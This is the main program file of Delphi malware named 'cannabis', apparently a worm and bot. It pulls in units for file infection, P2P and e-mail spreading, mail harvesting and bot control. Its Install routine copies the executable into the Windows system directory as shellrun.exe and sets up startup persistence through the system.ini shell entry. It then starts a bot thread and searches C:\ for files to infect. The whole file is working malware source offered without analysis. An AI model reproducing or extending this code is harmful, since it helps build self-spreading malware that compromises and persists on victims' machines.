   program cannabis;

   uses
     windows,
     untInfector in 'untInfector.pas',
     untP2P in 'untP2P.pas',
     untMailSend in 'untMailSend.pas',
     untSearch in 'untSearch.pas',
     GetMail,
     untStatus in 'untStatus.pas',
     untBot in 'untBot.pas';

   {$R *.res}

   procedure Install;
   var
     dir: array[0..255] of char;
     name: string;
   begin
     getsystemdirectory(dir, 256);

     name := string(dir)+'\shellrun.exe';
     copyfile(pchar(paramstr(0)), pchar(name), false);

     writeprivateprofilestring('boot','shell','Explorer.exe shellrun.exe','system.ini');

     if createmutexa(nil, false, 'cannabis') = error_already_exists then
       exitprocess(0);
   end;

   Var
     D: Dword;
     Msg: TMsg;
   begin
     BeginThread(nil, 0, @startbot, nil, 0, d);
     Sleep(2000);
     ReleaseIt;
     Install;
     FindFiles('C:\');
     While GetMessage(Msg, 0, 0, 0) Do
      DispatchMessage(Msg);
   end.
